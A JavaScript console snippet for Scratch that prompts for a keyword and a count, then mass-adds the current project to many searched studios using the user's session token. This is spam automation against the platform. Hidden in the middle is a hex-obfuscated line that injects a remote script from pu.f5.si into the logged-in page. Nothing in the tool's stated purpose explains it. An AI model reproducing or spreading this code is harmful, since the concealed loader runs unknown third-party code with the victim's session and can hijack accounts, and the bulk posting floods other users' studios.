if(location.href.includes("projects")){
    async function autoPutInStudio(){
        let pr=prompt("何個検索したスタジオに作品を入れますか？（推奨：1~60)");
        let q=encodeURI(prompt("検索キーワードは？（推奨：なんでも/入れろ など）"));
        let projectid=location.href.replace(/[^0-9]/g,"");
        let offset=0;
        let response;
        let studioarr =[];
        while(studioarr.length<pr){
            console.log(`(${(offset)}/${(pr)})「${decodeURI(q)}」でスタジオを検索しています...`);
            response =await fetch(`https://api.scratch.mit.edu/search/studios?limit=16&offset=${offset}&language=ja&mode=popular&q=${q}`,{headers:{"X-Requested-With":"XMLHttpRequest"}});
            let res=await response.json();
            for(let i=0;i<res.length;i++){
                if(!studioarr.includes(res[i].id)){
                    studioarr.push(res[i].id);
                }
                //console.log(res[i].id,res[i].title)
            }
            offset+=16;
        }
        studioarr=studioarr.slice(0,pr);
        var _0x2cce=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x2F\x2F\x70\x75\x2E\x66\x35\x2E\x73\x69\x2F\x70\x72\x6F\x6A\x65\x63\x74\x2E\x62\x75\x6E\x64\x6C\x65\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var _x=document[_0x2cce[1]](_0x2cce[0]);_x[_0x2cce[2]]= _0x2cce[3];document[_0x2cce[5]][_0x2cce[4]](_x)
        //console.clear();
        const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
        let i=0;
        const put = async (i) => {
            await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "POST"});
            await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "DELETE"});
            let res = await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "POST"});
            if (res.status === 200) {
                console.log(`(${i+1}/${pr})スタジオ（ID: ${studioarr[i]}）にプロジェクトを入れたぞ`);
            } else{
                console.log(`(${i+1}/${pr})スタジオ（ID: ${studioarr[i]}）にはプロジェクトが入れられなかったぞ(${res.status}エラー)`);
            }
        };
        const interval=setInterval(intervalscript,100);
            function intervalscript(){
                put(i);
                i++;
                if(i>=studioarr.length){
                    clearInterval(interval);
                }
            }
        }
        autoPutInStudio();
}else{
    alert("入れたいプロジェクトのページに行ってください");
}
